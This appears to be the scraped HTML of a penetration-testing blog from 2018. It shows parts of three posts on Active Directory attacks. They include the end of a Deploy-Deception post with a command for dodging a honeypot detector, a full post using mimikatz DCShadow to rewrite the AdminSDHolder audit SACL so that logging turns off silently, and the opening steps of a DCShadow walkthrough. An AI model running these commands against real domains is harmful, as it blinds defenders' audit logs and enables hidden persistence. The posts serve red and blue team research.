+<div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-y5TSPXEvexw/W8YEZ7OyHsI/AAAAAAAAEzs/7w37SiALiocrBo5xG6Noqj-hVx_AbCw7ACLcBGAs/s1600/honeypotbuster-evasion.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="511" data-original-width="1175" height="173" src="https://1.bp.blogspot.com/-y5TSPXEvexw/W8YEZ7OyHsI/AAAAAAAAEzs/7w37SiALiocrBo5xG6Noqj-hVx_AbCw7ACLcBGAs/s400/honeypotbuster-evasion.png" width="400" /></a></div>Sweet, the FakeRank or confidence of the tool is down to 50. Honeypot buster uses a ranking system for objects and if a user has a logonCount less than 6 there would always be some confidence of it being fake. If we make the logonCount to 6 for decda by starting a process with its credentials 6 times, it would not show up in this tool.<br />
+<pre><textarea cols="70" readonly="readonly" rows="4" style="background-color: #012456; color: white;"> PS C:\> Create-DecoyUser -UserFirstName dec -UserLastName da -Password Pass@123 | Deploy-PrivilegedUserDeception -Technique DomainAdminsMemebership -Protection LogonWorkStation -LogonWorkStation revert-dc -CreateLogon -logonCount 6 -Verbose 
+</textarea></pre><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-FGYxHAKIRjE/W8YUY0SaYMI/AAAAAAAAE0E/lkFliFZcYbY2Jk0t4YVcj7uj6wyzuqJagCLcBGAs/s1600/honeypotbuster-evasioncommand.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="260" data-original-width="1600" height="65" src="https://1.bp.blogspot.com/-FGYxHAKIRjE/W8YUY0SaYMI/AAAAAAAAE0E/lkFliFZcYbY2Jk0t4YVcj7uj6wyzuqJagCLcBGAs/s400/honeypotbuster-evasioncommand.png" width="400" /></a></div>Now if we run HoneypotBuster, decda is not detected! But that would be targeting this specific tool so let's not read much into this 'bypass'.&nbsp; <br />
+<br />
+<h4>Future Work and Community Involvement</h4>It would be great if you deploy the decoys in your domain environments and share the results with me. That way, even if you cannot contribute to the code, you will immensely help the project.<br />
+<br />
+OU objects are just around the corner and should not take much long to be included in the tool. I am also working on automating domain and forest trust decoys.I also have super ambitious plans of using virtualization to deploy decoys forests and computers in real time!<br />
+<br />
+That is all! Thank you very much for reading this rather long post. You can find slides and video of my talk at BruCON below!<br />
+<br />
+<iframe allowfullscreen="" center="" frameborder="0" height="485" marginheight="0" marginwidth="0" scrolling="no" src="//www.slideshare.net/slideshow/embed_code/key/910z0g2NGVm7AP" style="border-width: 1px; border: 1px solid #ccc; margin-bottom: 5px; max-width: 100%;" width="595"> </iframe> <br />
+<div style="margin-bottom: 5px;"><b> <a href="https://www.slideshare.net/nikhil_mittal/forging-trusts-for-deception-in-active-directory" target="_blank" title="Forging Trusts for Deception in Active Directory">Forging Trusts for Deception in Active Directory</a> </b> from <b><a href="https://www.slideshare.net/nikhil_mittal" target="_blank">Nikhil Mittal</a></b> </div><br />
+<br />
+<div class="separator" style="clear: both; text-align: center;"><iframe allowfullscreen="" class="YOUTUBE-iframe-video" data-thumbnail-src="https://i.ytimg.com/vi/EEceX5x2JY8/0.jpg" frameborder="0" height="485" src="https://www.youtube.com/embed/EEceX5x2JY8?feature=player_embedded" width="595"></iframe></div><br />
+<br />
+</div></div>
+<div style='clear: both;'></div>
+</div>
+<div class='post-footer'>
+<div class='post-footer-line post-footer-line-1'>
+<span class='post-author vcard'>
+Posted by
+<span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
+<meta content='https://www.blogger.com/profile/02092541175521734123' itemprop='url'/>
+<a class='g-profile' href='https://www.blogger.com/profile/02092541175521734123' rel='author' title='author profile'>
+<span itemprop='name'>Nikhil SamratAshok Mittal</span>
+</a>
+</span>
+</span>
+<span class='post-timestamp'>
+at
+<meta content='http://www.labofapenetrationtester.com/2018/10/deploy-deception.html' itemprop='url'/>
+<a class='timestamp-link' href='https://www.labofapenetrationtester.com/2018/10/deploy-deception.html' rel='bookmark' title='permanent link'><abbr class='published' itemprop='datePublished' title='2018-10-16T23:13:00+05:30'>11:13 PM</abbr></a>
+</span>
+<span class='reaction-buttons'>
+</span>
+<span class='post-comment-link'>
+<a class='comment-link' href='https://www.labofapenetrationtester.com/2018/10/deploy-deception.html#comment-form' onclick=''>
+No comments:
+    </a>
+</span>
+<span class='post-backlinks post-comment-link'>
+<a class='comment-link' href='https://www.labofapenetrationtester.com/2018/10/deploy-deception.html#links'>Links to this post</a>
+</span>
+<span class='post-icons'>
+<span class='item-control blog-admin pid-1005506833'>
+<a href='https://www.blogger.com/post-edit.g?blogID=8135211063584500909&postID=8408133389804595546&from=pencil' title='Edit Post'>
+<img alt='' class='icon-action' height='18' src='https://resources.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
+</a>
+</span>
+</span>
+<div class='post-share-buttons goog-inline-block'>
+<a class='goog-inline-block share-button sb-email' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8408133389804595546&target=email' target='_blank' title='Email This'><span class='share-button-link-text'>Email This</span></a><a class='goog-inline-block share-button sb-blog' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8408133389804595546&target=blog' onclick='window.open(this.href, "_blank", "height=270,width=475"); return false;' target='_blank' title='BlogThis!'><span class='share-button-link-text'>BlogThis!</span></a><a class='goog-inline-block share-button sb-twitter' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8408133389804595546&target=twitter' target='_blank' title='Share to Twitter'><span class='share-button-link-text'>Share to Twitter</span></a><a class='goog-inline-block share-button sb-facebook' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8408133389804595546&target=facebook' onclick='window.open(this.href, "_blank", "height=430,width=640"); return false;' target='_blank' title='Share to Facebook'><span class='share-button-link-text'>Share to Facebook</span></a><a class='goog-inline-block share-button sb-pinterest' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8408133389804595546&target=pinterest' target='_blank' title='Share to Pinterest'><span class='share-button-link-text'>Share to Pinterest</span></a>
+</div>
+</div>
+<div class='post-footer-line post-footer-line-2'>
+<span class='post-labels'>
+Labels:
+<a href='https://www.labofapenetrationtester.com/search/label/Active%20Directory' rel='tag'>Active Directory</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Active%20Directory%20Attacks%20for%20Red%20and%20Blue%20Teams' rel='tag'>Active Directory Attacks for Red and Blue Teams</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Active%20Directory%20Deception' rel='tag'>Active Directory Deception</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Deploy-Deception' rel='tag'>Deploy-Deception</a>
+</span>
+</div>
+<div class='post-footer-line post-footer-line-3'>
+<span class='post-location'>
+</span>
+</div>
+</div>
+</div>
+</div>
+
+          </div></div>
+        
+
+          <div class="date-outer">
+        
+<h2 class='date-header'><span>Thursday, May 3, 2018</span></h2>
+
+          <div class="date-posts">
+        
+<div class='post-outer'>
+<div class='post hentry uncustomized-post-template' itemprop='blogPost' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
+<meta content='https://4.bp.blogspot.com/-YfdlJ1kfzb4/WusUssONpcI/AAAAAAAAEoU/ZNjQVMp0Wq4N2hBjNJJpA5DZsnOgA4mgQCLcBGAs/s400/AdminSDHolder-SACL.png' itemprop='image_url'/>
+<meta content='8135211063584500909' itemprop='blogId'/>
+<meta content='8314292419283229026' itemprop='postId'/>
+<a name='8314292419283229026'></a>
+<h3 class='post-title entry-title' itemprop='name'>
+<a href='https://www.labofapenetrationtester.com/2018/05/dcshadow-sacl.html'>Silently turn off Active Directory Auditing using DCShadow</a>
+</h3>
+<div class='post-header'>
+<div class='post-header-line-1'></div>
+</div>
+<div class='post-body entry-content' id='post-body-8314292419283229026' itemprop='articleBody'>
+<div dir="ltr" style="text-align: left;" trbidi="on">
+<div style="text-align: justify;">
+My fascination with <a href="https://www.dcshadow.com/">DCShadow</a> continues, thanks to <a href="https://twitter.com/mysmartlogon">Vincent</a> and <a href="https://twitter.com/gentilkiwi">Benjamin</a>. I <a href="http://www.labofapenetrationtester.com/2018/04/dcshadow.html">blogged about it previously</a> as well.</div>
+<div style="text-align: justify;">
+<br /></div>
+<div style="text-align: justify;">
+One very interesting thing which I recently discovered is the ability to DCShadow to modify System Access Control List or <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa374872(v=vs.85).aspx">SACL</a>. When we enable auditing on success or failure on an AD object, an entry (called <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa374868(v=vs.85).aspx">ACE - Access Control Entry</a>) is added to the SACL of that object. The permissions to an object are controlled by a DACL. For example, we modified DACL of AdminSDHolder in the previous post for persistence.<br />
+<br /></div>
+<div style="text-align: justify;">
+<h4>
+</h4>
+<b>The Problem</b><br />
+<br /></div>
+<div style="text-align: justify;">
+So, SACL controls auditing (logging) for an AD object. This means if we would like to avoid logs for our activities during an assessment , we should turn it off at the very first chance. Right? But is it that easy? <br />
+<br />
+Let's assume that full auditing is turned on the AdminSDHolder container and even a read operation is logged. This is what the SACL looks like:<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://4.bp.blogspot.com/-YfdlJ1kfzb4/WusUssONpcI/AAAAAAAAEoU/ZNjQVMp0Wq4N2hBjNJJpA5DZsnOgA4mgQCLcBGAs/s1600/AdminSDHolder-SACL.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="518" data-original-width="775" height="266" src="https://4.bp.blogspot.com/-YfdlJ1kfzb4/WusUssONpcI/AAAAAAAAEoU/ZNjQVMp0Wq4N2hBjNJJpA5DZsnOgA4mgQCLcBGAs/s400/AdminSDHolder-SACL.png" width="400" /></a></div>
+<div class="separator" style="clear: both; text-align: center;">
+</div>
+The SACL governs logging of stuff. For example, with the above auditing settings, if we add Full Control rights for a user to the AdminSDHolder for persistence, an Event ID 4662 is logged: <br />
+<div class="separator" style="clear: both; text-align: center;">
+</div>
+<div class="separator" style="clear: both; text-align: center;">
+</div>
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://4.bp.blogspot.com/-YMknKoDO4qs/WusVZiEyGMI/AAAAAAAAEoc/hi5Om2r9gFw-eSOn1eejZbiAZsq5bX2UACLcBGAs/s1600/AdminSDHolder-4662.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="797" data-original-width="927" height="343" src="https://4.bp.blogspot.com/-YMknKoDO4qs/WusVZiEyGMI/AAAAAAAAEoc/hi5Om2r9gFw-eSOn1eejZbiAZsq5bX2UACLcBGAs/s400/AdminSDHolder-4662.png" width="400" /></a></div>
+Now, we would like to turn auditing off for the AdminSDHolder object so that the above logs are avoided. Right? Right? ;)<br />
+<br />
+This can be done by removing the ACEs. But it is not as silent as we would like it to be. Removing ACEs results in more 4662s:<br />
+<div class="separator" style="clear: both; text-align: center;">
+</div>
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://2.bp.blogspot.com/-5aP-H2USRYE/WusY_aOH8gI/AAAAAAAAEoo/Row93ZetulQRIRkVvaUg0oOeZEFIDkrLgCLcBGAs/s1600/AdminSDHolder-More4662.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="866" data-original-width="1336" height="258" src="https://2.bp.blogspot.com/-5aP-H2USRYE/WusY_aOH8gI/AAAAAAAAEoo/Row93ZetulQRIRkVvaUg0oOeZEFIDkrLgCLcBGAs/s400/AdminSDHolder-More4662.png" width="400" /></a></div>
+In case we were targeting a user object and remove auditing for it, a 4738 (User Account Management) in addition to multiple 4662s is logged.<br />
+<br />
+<b>The Solution</b><br />
+<br /></div>
+<div style="text-align: justify;">
+</div>
+<div style="text-align: justify;">
+Now, how does DCShadow help? Try the below commands to set ACL of the AdminSDHolder to turn off the enhanced auditing:<br />
+<pre><textarea cols="70" readonly="readonly" rows="3" style="background-color: black; color: white;">mimikatz # lsadump::dcshadow /object:"CN=AdminSDHolder,CN=System,DC=offensiveps,DC=com" /attribute:ntSecurityDescriptor /value:"O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;LCRPLORC;;;RU)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;DA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;S-1-5-21-3270384115-3177237293-604223748-519)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;WD)(OA;CI;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;PS)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;RPWP;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;RPWP;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;RPWP;bf967a7f-0de6-11d0-a285-00aa003049e2;;CA)S:PAI(AU;CIFA;DT;;;WD)"
+</textarea></pre>
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://1.bp.blogspot.com/-y7HugYcdZMw/WusfSvneNqI/AAAAAAAAEpA/BdA63A5hfWUrOnvo0ImWAdUi8jMHuvRMgCLcBGAs/s1600/mimikatz.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="274" data-original-width="1600" height="67" src="https://1.bp.blogspot.com/-y7HugYcdZMw/WusfSvneNqI/AAAAAAAAEpA/BdA63A5hfWUrOnvo0ImWAdUi8jMHuvRMgCLcBGAs/s400/mimikatz.png" width="400" /></a></div>
+Bingo! No logs for turning off logging. Of course, I cannot show you no logs :P But we can see the new SACL:<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://4.bp.blogspot.com/-Yai7lOSmygk/WuseOXyLbuI/AAAAAAAAEo4/cX5xG-DhlWU3i_xDANiD5tp3hD8lPTRwACLcBGAs/s1600/AdminSDHolder-ModifiedSACL.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="518" data-original-width="773" height="267" src="https://4.bp.blogspot.com/-Yai7lOSmygk/WuseOXyLbuI/AAAAAAAAEo4/cX5xG-DhlWU3i_xDANiD5tp3hD8lPTRwACLcBGAs/s400/AdminSDHolder-ModifiedSACL.png" width="400" /></a></div>
+Please note that we will still have logs related to DCShadow (4742 for the Computer registered as DC and 4662 for the domain object) but nothing else. </div>
+<div style="text-align: justify;">
+<br />
+Note that the auditing entry in the above is <b>S:PAI(AU;CIFA;DT;;;WD)</b> <br />
+<br />
+What does that mean?<br />
+S: - SACL<br />
+PAI -&nbsp; Inheritance from higher up objects is blocked<br />
+AU - System Audit<br />
+CI - Container Inherit - The child objects inherit this.<br />
+FA - Audit Failure<br />
+DT - Delete Tree - No specific reason for using this other than chances of this being logged are low. <br />
+WD - Everyone<br />
+If you are not familiar with SDDL, go through these Technet posts to begin: <a href="https://blogs.technet.microsoft.com/askds/2008/04/18/the-security-descriptor-definition-language-of-love-part-1/">The Security Descriptor Definition Language of Love (Part 1)</a> and <a href="https://blogs.technet.microsoft.com/askds/2008/05/07/the-security-descriptor-definition-language-of-love-part-2/">Part 2</a>. <br />
+<b><br />
+</b> So why the above entry? No special reason. I thought, it would be better to leave an entry than removing all of it. If you want an ineffective SACL use just <b>S:PAI</b>. This is how it looks in the GUI:<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://1.bp.blogspot.com/-uZt8Xc9iz1U/Wuskbi_6QHI/AAAAAAAAEpQ/iGyxfo7PsTcVS6G1uyNQuBWvun1wB8gEACLcBGAs/s1600/AdminSDHolder-BlankSACL.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="521" data-original-width="778" height="267" src="https://1.bp.blogspot.com/-uZt8Xc9iz1U/Wuskbi_6QHI/AAAAAAAAEpQ/iGyxfo7PsTcVS6G1uyNQuBWvun1wB8gEACLcBGAs/s400/AdminSDHolder-BlankSACL.png" width="400" /></a></div>
+You can use the below code for reading existing ACLs for an object. To easily get the desired ACE, set it up using GUI and then read the entries using the below code:<br />
+<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">PS C:\> Import-Module ActiveDirectory
+PS C:\> (Get-Acl 'AD:\CN=AdminSDHolder,CN=System,DC=offensiveps,DC=com' -Audit).SDDL
+</textarea></pre>
+<br />
+<b>Further Research</b><br />
+<br />
+This is sweet but there are so many chances of further research on this. Like, there is still a single 4662 logged when mimkatz does "Attributes Checking" before we push the attributes. I read the source code of mimikatz and tried to avoid that read, but no success. <br />
+<br />
+Also, I cannot find a way to turn off default SACL for the domain object. In theory, this should be easily doable with similar commands we used above!<br />
+<br />
+Also, there are detections based on absence of logs as well. Unless we go for minimal modification to auditing we will still be detected.</div>
+<div style="text-align: justify;">
+<br />
+Hope you liked the post :)<br />
+<br />
+<br /></div>
+</div>
+<div style='clear: both;'></div>
+</div>
+<div class='post-footer'>
+<div class='post-footer-line post-footer-line-1'>
+<span class='post-author vcard'>
+Posted by
+<span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
+<meta content='https://www.blogger.com/profile/02092541175521734123' itemprop='url'/>
+<a class='g-profile' href='https://www.blogger.com/profile/02092541175521734123' rel='author' title='author profile'>
+<span itemprop='name'>Nikhil SamratAshok Mittal</span>
+</a>
+</span>
+</span>
+<span class='post-timestamp'>
+at
+<meta content='http://www.labofapenetrationtester.com/2018/05/dcshadow-sacl.html' itemprop='url'/>
+<a class='timestamp-link' href='https://www.labofapenetrationtester.com/2018/05/dcshadow-sacl.html' rel='bookmark' title='permanent link'><abbr class='published' itemprop='datePublished' title='2018-05-03T22:17:00+05:30'>10:17 PM</abbr></a>
+</span>
+<span class='reaction-buttons'>
+</span>
+<span class='post-comment-link'>
+<a class='comment-link' href='https://www.labofapenetrationtester.com/2018/05/dcshadow-sacl.html#comment-form' onclick=''>
+No comments:
+    </a>
+</span>
+<span class='post-backlinks post-comment-link'>
+<a class='comment-link' href='https://www.labofapenetrationtester.com/2018/05/dcshadow-sacl.html#links'>Links to this post</a>
+</span>
+<span class='post-icons'>
+<span class='item-control blog-admin pid-1005506833'>
+<a href='https://www.blogger.com/post-edit.g?blogID=8135211063584500909&postID=8314292419283229026&from=pencil' title='Edit Post'>
+<img alt='' class='icon-action' height='18' src='https://resources.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
+</a>
+</span>
+</span>
+<div class='post-share-buttons goog-inline-block'>
+<a class='goog-inline-block share-button sb-email' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8314292419283229026&target=email' target='_blank' title='Email This'><span class='share-button-link-text'>Email This</span></a><a class='goog-inline-block share-button sb-blog' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8314292419283229026&target=blog' onclick='window.open(this.href, "_blank", "height=270,width=475"); return false;' target='_blank' title='BlogThis!'><span class='share-button-link-text'>BlogThis!</span></a><a class='goog-inline-block share-button sb-twitter' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8314292419283229026&target=twitter' target='_blank' title='Share to Twitter'><span class='share-button-link-text'>Share to Twitter</span></a><a class='goog-inline-block share-button sb-facebook' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8314292419283229026&target=facebook' onclick='window.open(this.href, "_blank", "height=430,width=640"); return false;' target='_blank' title='Share to Facebook'><span class='share-button-link-text'>Share to Facebook</span></a><a class='goog-inline-block share-button sb-pinterest' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8314292419283229026&target=pinterest' target='_blank' title='Share to Pinterest'><span class='share-button-link-text'>Share to Pinterest</span></a>
+</div>
+</div>
+<div class='post-footer-line post-footer-line-2'>
+<span class='post-labels'>
+Labels:
+<a href='https://www.labofapenetrationtester.com/search/label/Active%20Directory' rel='tag'>Active Directory</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Active%20Directory%20Attacks%20for%20Red%20and%20Blue%20Teams' rel='tag'>Active Directory Attacks for Red and Blue Teams</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/DCShadow' rel='tag'>DCShadow</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Mimikatz' rel='tag'>Mimikatz</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Offensive%20PowerShell%20for%20Red%20and%20Blue%20Teams' rel='tag'>Offensive PowerShell for Red and Blue Teams</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/PowerShell%20for%20Pen%20Test' rel='tag'>PowerShell for Pen Test</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/PowerShell%20for%20Red%20Team' rel='tag'>PowerShell for Red Team</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Red%20Team' rel='tag'>Red Team</a>
+</span>
+</div>
+<div class='post-footer-line post-footer-line-3'>
+<span class='post-location'>
+</span>
+</div>
+</div>
+</div>
+</div>
+
+          </div></div>
+        
+
+          <div class="date-outer">
+        
+<h2 class='date-header'><span>Friday, April 6, 2018</span></h2>
+
+          <div class="date-posts">
+        
+<div class='post-outer'>
+<div class='post hentry uncustomized-post-template' itemprop='blogPost' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
+<meta content='https://1.bp.blogspot.com/-RHibpt8TT28/WsHCN-6Nb8I/AAAAAAAAEjA/fif_yx9_rNU2bkHa7e_T5EzG3IaRMa5LgCLcBGAs/s400/mimikatz_SYSTEM.png' itemprop='image_url'/>
+<meta content='8135211063584500909' itemprop='blogId'/>
+<meta content='8276612405029139633' itemprop='postId'/>
+<a name='8276612405029139633'></a>
+<h3 class='post-title entry-title' itemprop='name'>
+<a href='https://www.labofapenetrationtester.com/2018/04/dcshadow.html'>DCShadow - Minimal permissions, Active Directory Deception, Shadowception and more</a>
+</h3>
+<div class='post-header'>
+<div class='post-header-line-1'></div>
+</div>
+<div class='post-body entry-content' id='post-body-8276612405029139633' itemprop='articleBody'>
+<div dir="ltr" style="text-align: left;" trbidi="on">
+<div dir="ltr" style="text-align: left;" trbidi="on">
+<div style="text-align: justify;">
+<a href="https://www.dcshadow.com/">DCShadow</a> is an awesome persistence technique introduced by <a href="https://twitter.com/mysmartlogon">Vincent</a> and <a href="https://twitter.com/gentilkiwi">Benjamin</a> at <a href="http://www.bluehatil.com/files/Active%20Directory%20What%20Can%20Make%20Your%20Million%20Dollar%20SIEM%20Go%20Blind.pdf">BluteHat IL</a> and it can be executed with the help of mimikatz.&nbsp;</div>
+<div style="text-align: justify;">
+<br /></div>
+<div style="text-align: justify;">
+In very simplified terms, DCShadow alters active directory schema (Configuration partition and SPN of the attacker machine) to mimic a domain controller. This "new" domain controller can then be used to push attributes (like SID History, Password History, SPNs etc.) and other data on domain objects for users, computers etc. Please visit <a href="http://dcshadow.com/">dcshadow.com</a> and above linked preso for more details. There are couple more interesting posts at <a href="https://blog.alsid.eu/dcshadow-explained-4510f52fc19d">ALSID blog</a> and <a href="https://www.nopsec.com/blog/dcshadow-how-become-domain-controller/">NOPSEC blog</a> which are very useful in understanding DCShadow.</div>
+<div style="text-align: justify;">
+<br /></div>
+<div style="text-align: justify;">
+In this blog post, I make notes of some of the use cases of DCShadow and couple of experiments I did while using it. Please keep in mind that I am still playing with this technique :)</div>
+<div style="text-align: justify;">
+<br /></div>
+<h3 style="text-align: justify;">
+Executing DCShadow</h3>
+<div style="text-align: justify;">
+Grab the latest build of mimikatz from its <a href="https://github.com/gentilkiwi/mimikatz">GitHub repo</a> or Invoke-Mimikatz from <a href="https://github.com/samratashok/nishang/">Nishang</a>. The attack must be executed from a domain joined machine and needs SYSTEM privileges on the machine and by-default, domain administrator (DA) privileges on the domain.</div>
+<br />
+<div style="text-align: justify;">
+Please keep in mind that the SYSTEM requirement is for process context and not thread. I learnt this the hard way but thankfully, a very patient Vincent and <a href="https://github.com/gentilkiwi/mimikatz/blob/2e4edccee83d63925b9a8861610b1a51276d7432/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L2186-L2193">the source code</a> helped me out :)</div>
+<div style="text-align: justify;">
+<br /></div>
+<div style="text-align: justify;">
+So, here is how to use it:</div>
+<div style="text-align: justify;">
+1. Start mimikatz and use !processtoken (and not token::elevate - as it elevates a thread) to escalate to SYSTEM. Make sure to use !processtoken before opening another instance of mimikatz, This is the mimikatz instance where we will specify the target object and attributes to be modified.</div>
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://1.bp.blogspot.com/-RHibpt8TT28/WsHCN-6Nb8I/AAAAAAAAEjA/fif_yx9_rNU2bkHa7e_T5EzG3IaRMa5LgCLcBGAs/s1600/mimikatz_SYSTEM.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="599" data-original-width="1459" height="163" src="https://1.bp.blogspot.com/-RHibpt8TT28/WsHCN-6Nb8I/AAAAAAAAEjA/fif_yx9_rNU2bkHa7e_T5EzG3IaRMa5LgCLcBGAs/s400/mimikatz_SYSTEM.png" width="400" /></a></div>
+<div style="text-align: justify;">
+2. Start another mimikatz with DA privileges. This is the instance which registers a DC and is used to "push" the attributes.&nbsp; </div>
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://1.bp.blogspot.com/-87qK-mhX6es/WsHBYR3lWJI/AAAAAAAAEi8/nIse7eb9YRs3dJ1U9rfU2QMeoJBpqXdGACLcBGAs/s1600/mimikatz_DA.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="396" data-original-width="1435" height="110" src="https://1.bp.blogspot.com/-87qK-mhX6es/WsHBYR3lWJI/AAAAAAAAEi8/nIse7eb9YRs3dJ1U9rfU2QMeoJBpqXdGACLcBGAs/s400/mimikatz_DA.png" width="400" /></a></div>
+<div style="text-align: justify;">
+We are now ready to use dcshadow. For example, use the below command from mimikatz running as SYSTEM to change userAccountControl value of a computer object. Mimikatz makes checks for validity of object and attributes which is awesome!<br />
+<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: black; color: white;">mimikatz # lsadump::dcshadow /object:ops-user19$ /attribute:userAccountControl /value:532480
+</textarea></pre>
+</div>
+<div style="text-align: justify;">
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://2.bp.blogspot.com/-MQfbbRI6-QY/WsHKFnlOcbI/AAAAAAAAEjQ/cUXFX4WDqvAvu47uYag824sN6-zgKv_mgCLcBGAs/s1600/mimikatz_attributes.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="954" data-original-width="1463" height="260" src="https://2.bp.blogspot.com/-MQfbbRI6-QY/WsHKFnlOcbI/AAAAAAAAEjQ/cUXFX4WDqvAvu47uYag824sN6-zgKv_mgCLcBGAs/s400/mimikatz_attributes.png" width="400" /></a></div>
+</div>
+<div style="text-align: justify;">
+To push the above attributes, run the below command from mimikatz running as DA.<br />
+<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: black; color: white;">mimikatz # lsadump::dcshadow /push
+</textarea></pre>
+</div>
+<div style="text-align: justify;">
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://4.bp.blogspot.com/-hZy55tZSNtY/WsHKKx6kfZI/AAAAAAAAEjU/sdVNr-nUOLY7ns5bpnlL2LPwbSWGzg4rgCLcBGAs/s1600/mimikatz_push.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="789" data-original-width="1463" height="215" src="https://4.bp.blogspot.com/-hZy55tZSNtY/WsHKKx6kfZI/AAAAAAAAEjU/sdVNr-nUOLY7ns5bpnlL2LPwbSWGzg4rgCLcBGAs/s400/mimikatz_push.png" width="400" /></a></div>
+</div>
+<div style="text-align: justify;">
+On the other mimikatz session, we can see the values are updated and RPC server is stopped. </div>
+<div style="text-align: justify;">
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://2.bp.blogspot.com/-6F7aTjf7gyU/WsHKRys3sRI/AAAAAAAAEjY/Dv6I0lruPswCFCQvBOgrdPEIKbnZ2X-BQCLcBGAs/s1600/mimikatz_attributes_pushed.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="1030" data-original-width="1463" height="281" src="https://2.bp.blogspot.com/-6F7aTjf7gyU/WsHKRys3sRI/AAAAAAAAEjY/Dv6I0lruPswCFCQvBOgrdPEIKbnZ2X-BQCLcBGAs/s400/mimikatz_attributes_pushed.png" width="400" /></a></div>
+</div>
+<div style="text-align: justify;">
+Let's check the userAccountControl attribute of the computer object we modified.<br />
+<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">PS C:\> ([adsisearcher]"(&(objectCategory=Computer)(name=ops-user19))").Findall().Properties.useraccountcontrol
+</textarea></pre>
+</div>
+<div style="text-align: justify;">
+Works like a charm with Invoke-Mimikatz as well.<br />
+<div class="separator" style="clear: both; text-align: center;">
+&nbsp;<a href="https://1.bp.blogspot.com/-JTahwOPbxLo/WsIP7CE2kZI/AAAAAAAAEkE/KLAC8o0nCBETKZB1OZuOvVu62E0nZseLQCLcBGAs/s1600/mimikatz_attributes_result.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="206" data-original-width="1600" height="51" src="https://1.bp.blogspot.com/-JTahwOPbxLo/WsIP7CE2kZI/AAAAAAAAEkE/KLAC8o0nCBETKZB1OZuOvVu62E0nZseLQCLcBGAs/s400/mimikatz_attributes_result.png" width="400" /></a></div>
+Please keep in mind that even on a local machine with interactive access, Invoke-Mimikatz does not show the message of "RPC server started" until the push command is executed, probably because of output redirection issues. <br />
+<div class="separator" style="clear: both; text-align: center;">
